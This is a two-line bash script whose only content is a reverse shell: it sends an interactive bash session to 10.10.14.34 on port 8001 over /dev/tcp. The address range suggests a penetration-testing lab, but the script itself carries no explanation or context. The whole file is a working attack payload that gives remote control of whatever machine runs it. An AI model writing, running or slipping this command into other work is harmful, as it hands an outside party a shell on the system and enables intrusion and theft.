#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.34/8001 0>&1
